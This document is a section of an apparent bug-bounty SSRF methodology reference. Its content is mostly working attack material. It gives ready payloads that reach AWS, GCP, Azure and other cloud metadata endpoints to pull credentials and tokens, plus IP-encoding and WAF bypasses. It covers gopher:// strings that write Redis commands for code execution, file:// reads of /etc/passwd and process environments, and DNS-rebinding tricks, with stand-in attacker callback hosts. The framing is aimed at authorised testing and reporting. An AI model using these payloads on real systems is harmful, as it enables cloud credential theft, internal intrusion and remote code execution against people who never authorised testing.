## 4. SSRF — SERVER-SIDE REQUEST FORGERY

### Injection Points
```
?url=, ?src=, ?redirect=, ?next=, ?image=, ?webhook=, ?callback=
JSON: {"webhook": "http://...", "avatar_url": "http://..."}
SVG: <image href="http://internal">
```

### SSRF Payloads (escalating impact)
```bash
# DNS-only (Informational — insufficient alone)
https://attacker.burpcollaborator.net

# Cloud metadata (Critical on cloud apps)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Internal port scan
http://localhost:6379     # Redis
http://localhost:9200     # Elasticsearch
http://localhost:2375     # Docker API (RCE)
http://localhost:8080     # Admin panel
```

### SSRF IP Bypass Techniques (11 techniques)

| Technique | Example | Notes |
|---|---|---|
| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| Short IP | `http://127.1` | Abbreviated notation |
| IPv6 | `http://[::1]` | Loopback in IPv6 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| DNS rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
| Redirect chain | External URL → 302 to internal | Vercel pattern — check each hop |
| URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
| CNAME to internal | Attacker domain → internal hostname | DNS points inward |
| Rare format | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |

### SSRF Impact Chain
- DNS-only = Informational
- Internal service accessible = Medium
- Cloud metadata = High (key exposure)
- Cloud metadata + exfil keys = Critical

**WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `tools/waf_encoder.py "<payload>" --class generic` — *optional wrapper; the encodings above work by hand if it's absent*.

### Non-HTTP Schemes — turn "internal fetch" into RCE/data-theft
An HTTP-only SSRF reaches a service but can't *speak its protocol*. `gopher://` lets you write **arbitrary bytes** to a TCP socket → you speak Redis/SMTP/Postgres directly. Only works if the fetcher (libcurl, some SDKs) allows the scheme — test it.

| Scheme | What it unlocks | Shape |
|---|---|---|
| `gopher://` | raw TCP → Redis, memcached, SMTP, FastCGI | `gopher://127.0.0.1:6379/_<CRLF-encoded Redis cmds>` |
| `dict://` | read one line from a service (banner/port probe, some memcached) | `dict://127.0.0.1:11211/stats` |
| `file://` | local file read | `file:///etc/passwd`, `file:///proc/self/environ` |
| `php://`, `data://` | source disclosure / wrapper RCE (PHP fetchers) | see `reference/23-lfi-rce.md` |

**Redis→RCE via gopher (concept):** SSRF writes Redis commands that set `dir`+`dbfilename` to a cron path (`/var/spool/cron/`) or webroot, then `SAVE` — Redis writes an attacker file. URL-encode the command stream (each `\r\n` → `%0d%0a`). Generate with **Gopherus** (`gopherus --exploit redis`). Same tool builds SMTP-send and FastCGI-RCE gopher strings.
- **FP-kill:** confirm the write actually landed (cron fired / key exists via a second SSRF `GET`) — a `gopher://` that returns nothing may have been dropped by the scheme filter, not executed.

### Cloud Metadata Matrix (each provider needs its own headers)
IMDS is the #1 SSRF payout, but v2/hardened endpoints need a specific request or you get an empty 200 and miss it:

| Provider | Endpoint | Required request |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | plain GET (only if v1 enabled) |
| AWS IMDSv2 | same | `PUT /latest/api/token` w/ `X-aws-ec2-metadata-token-ttl-seconds: 21600` → send returned token as `X-aws-ec2-metadata-token` (needs an SSRF that controls method+headers) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | header `Metadata-Flavor: Google` (mandatory) |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | header `Metadata: true` + `api-version` query |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | plain GET |
| Alibaba | `http://100.100.100.100/latest/meta-data/` | plain GET |
| Oracle OCI | `http://169.254.169.254/opc/v2/instance/` | header `Authorization: Bearer Oracle` |

- IMDSv2 / GCP-header requirements mean a **header-less** SSRF (e.g. plain `?url=`) may only reach v1 — note this in the report; a blind IMDSv2 hit still proves the SSRF even without creds.

### Blind SSRF — confirm without a visible response
When the response body isn't reflected, prove server-side origin, don't guess:
- **OOB DNS+HTTP:** point at `YOURID.oastify.com` (interactsh/Collaborator); a hit from the *target's* egress IP = confirmed. DNS-only hit = the app resolves but may not fetch → still Info until you get an HTTP hit or timing signal.
- **Timing oracle for internal ports:** open port → fast RST/connect; filtered → hangs to timeout. Diff response time of `:6379` (open) vs `:6380` (closed) to map internal services blind.
- **Webhook DNS-rebind:** for user-supplied webhook URLs that validate-then-fetch, serve a record with **TTL 0** that answers public on first lookup (validation) and `169.254.169.254`/internal on the second (fetch). TOCTOU between check and use.
- **FP-kill:** a Collaborator DNS hit during page *render/preview* can be the server pre-fetching your link (link-unfurl), not SSRF — re-test with the URL removed from the field; if the callback still comes, it's pre-fetch. (See `reference/false-positive-guidance.md`.)
